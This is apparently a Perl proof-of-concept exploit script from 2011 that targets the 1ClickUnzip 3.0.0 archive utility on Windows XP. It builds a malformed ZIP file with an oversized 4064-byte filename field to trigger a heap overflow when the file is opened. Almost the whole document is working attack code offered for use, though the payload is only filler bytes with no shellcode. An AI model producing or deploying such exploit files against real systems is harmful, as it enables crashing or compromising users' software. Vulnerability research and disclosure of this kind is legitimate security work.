#!/usr/bin/perl
#
#[+]Exploit Title: 1ClickUnzip 3.00 .ZIP File Heap Overflow Vulnerability
#[+]Date: 05\06\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.softpedia.com/progDownload/1-Click-Unzip-Download-77210.html
#[+]Version: 3.0.0
#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
#[+]CVE: N/A
#
#

use strict;
use warnings;

my $filename = "Exploit.zip"; 

print "\n\n\t\t1ClickUnzip 3.0.0 .ZIP File Heap Overflow\n";
print "\t\tCreated by C4SS!0 G0M3S\n";
print "\t\tE-mail Louredo_\@hotmail.com\n";
print "\t\tSite www.exploit-br.org/\n\n";
sleep(1);

my $head = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $head2 = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f".
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $head3 = "\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00".
"\x02\x10\x00\x00".
"\x00\x00";

my $payload = "\x41" x 4064;


$payload = $payload.".txt";
my $zip = $head.$payload.$head2.$payload.$head3;
open(FILE,">$filename") || die "[-]Error:\n$!\n";
print FILE $zip;
close(FILE);
print "[+] ZIP File Created With Sucess:)\n";
sleep(3);
